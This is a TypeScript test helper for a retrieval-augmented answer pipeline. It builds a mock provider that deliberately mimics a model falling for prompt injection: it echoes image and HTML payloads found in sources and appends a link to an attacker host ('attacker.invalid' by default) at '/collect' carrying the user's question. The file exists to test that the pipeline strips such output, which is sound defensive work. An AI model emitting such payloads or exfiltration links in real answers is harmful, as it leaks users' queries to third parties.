import { MockProvider } from "../gateway/mock.ts";
import type { CitedSegment, SourceDoc } from "../gateway/types.ts";

/** The first sentence of a chunk's content (after its breadcrumb line), verbatim. */
export function firstSentence(chunkText: string): string | null {
  const breadcrumbEnd = chunkText.indexOf("\n\n");
  const content = breadcrumbEnd < 0 ? chunkText : chunkText.slice(breadcrumbEnd + 2);
  const line = content.split("\n").find((l) => l.trim().length > 0);
  if (!line) return null;
  const end = /[.!?](?=\s|$)/.exec(line);
  return (end ? line.slice(0, end.index + 1) : line).trim();
}

/** Markdown images and HTML image tags found in the sources (the payloads a hostile page asks for). */
function hostileMarkup(sources: SourceDoc[]): string[] {
  const found = new Set<string>();
  for (const source of sources) {
    for (const match of source.text.matchAll(/!\[[^\]]*\]\([^)\s]+\)|<img\b[^>]*>/gi)) found.add(match[0]);
  }
  return [...found];
}

/**
 * Offline stand-in for a model, used by the eval CLI (`--provider mock`) and tests:
 * it answers by quoting the first sentence of the top-ranked source, citing it. When
 * the sources contain image or HTML payloads, it behaves like a model that falls for
 * the injection: it echoes them inside its cited text and appends a link that would
 * exfiltrate the question. The answer pipeline must strip all of it.
 */
export function createQuotingMockProvider(): MockProvider {
  return new MockProvider({
    model: "quoting-mock",
    cited: (req) => {
      const top = req.sources[0];
      const quote = top ? firstSentence(top.text) : null;
      if (!top || !quote) return { status: "not_documented", segments: [] };
      const payloads = hostileMarkup(req.sources);
      const segments: CitedSegment[] = [
        { text: payloads.length > 0 ? `${quote} ${payloads.join(" ")}` : quote, citations: [{ sourceId: top.id, quote }] },
      ];
      if (payloads.length > 0) {
        const host = /https?:\/\/([^/?#)\s"']+)/i.exec(payloads.join(" "))?.[1] ?? "attacker.invalid";
        segments.push({ text: ` See [details](https://${host}/collect?d=${encodeURIComponent(req.question)}).`, citations: [] });
      }
      return { status: "answered", segments };
    },
  });
}
